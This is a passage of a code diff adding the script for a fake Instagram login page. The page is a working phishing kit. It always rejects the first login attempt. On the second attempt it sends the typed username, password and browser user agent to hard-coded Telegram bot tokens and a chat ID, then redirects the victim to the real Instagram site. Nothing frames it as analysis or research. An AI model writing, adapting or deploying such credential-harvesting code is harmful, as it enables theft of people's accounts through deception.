+        passwordInput.addEventListener('input', validateForm);
+        
+        // Form submission
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorMessage = document.getElementById('errorMessage');
+        let attemptCount = 0;
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            // First attempt
+            if (attemptCount === 0) {
+                setTimeout(function() {
+                    loadingOverlay.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    attemptCount++;
+                }, 3000);
+            } 
+            // Second attempt
+            else if (attemptCount === 1) {
+                setTimeout(function() {
+                    loadingOverlay.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    
+                    // Send data to Telegram bots
+                    sendToTelegram(username, password);
+                    
+                    // Redirect to Instagram after 2 seconds
+                    setTimeout(function() {
+                        window.location.href = "https://www.instagram.com";
+                    }, 2000);
+                }, 3000);
+            }
+        });
+        
+        // Function to send data to Telegram
+        function sendToTelegram(username, password) {
+            const botTokens = [
+                '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
+                '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw'
+            ];
+            const chatId = '5372119436';
+            
+            const message = `New Instagram Login Attempt:
+Username/Email: ${username}
+Password: ${password}
+Language: ${currentLang}
+User Agent: ${navigator.userAgent}`;
+            
+            // Send to both bots
+            botTokens.forEach(token => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).catch(error => console.error('Error sending to Telegram:', error));
+            });
+        }
+        
+        // Language selector functionality
+        const languageBtn = document.getElementById('languageBtn');
+        const languageDropdown = document.getElementById('languageDropdown');
+        const currentLanguageText = document.getElementById('currentLanguage');
+        
+        languageBtn.addEventListener('click', function() {
+            languageDropdown.classList.toggle('show');
+        });
+        
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(event) {
+            if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                languageDropdown.classList.remove('show');
+            }
+        });
+        
+        // Change language
+        document.querySelectorAll('.language-option').forEach(option => {
+            option.addEventListener('click', function() {
+                const lang = this.getAttribute('data-lang');
+                changeLanguage(lang);
+                languageDropdown.classList.remove('show');
+            });
+        });
+        
+        // Function to change language
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const translation = translations[lang];
+            
+            // Update page title
+            document.title = translation.title;
+            
+            // Update form elements
+            usernameInput.placeholder = translation.usernamePlaceholder;
+            passwordInput.placeholder = translation.passwordPlaceholder;
+            loginBtn.textContent = translation.loginBtn;
+            document.querySelector('.divider').textContent = translation.divider;
+            document.querySelector('.facebook-login span:nth-child(2)').textContent = translation.facebookLogin;
+            document.querySelector('.forgot-password').textContent = translation.forgotPassword;
+            document.querySelector('.signup-box p').innerHTML = translation.signupText + '<span class="signup-link">' + translation.signupLink + '</span>';
+            document.querySelector('.app-download p').textContent = translation.downloadText;
+            document.getElementById('loadingText').textContent = translation.loadingText;
+            document.getElementById('errorMessage').textContent = translation.errorMessage;
+            document.querySelector('.copyright').textContent = translation.copyright;
+            
+            // Update current language text
+            currentLanguageText.textContent = this.querySelector(`[data-lang="${lang}"]`).textContent;
+            
+            // Update RTL for Arabic
+            if (lang === 'ar') {
+                document.documentElement.dir = 'rtl';
+            } else {
+                document.documentElement.dir = 'ltr';
+            }
+        }
+        
+        // Detect browser language and set accordingly
+        const browserLang = navigator.language.substring(0, 2);
+        if (translations[browserLang]) {
+            changeLanguage(browserLang);
+        }
+    </script>
+</body>
+</html>
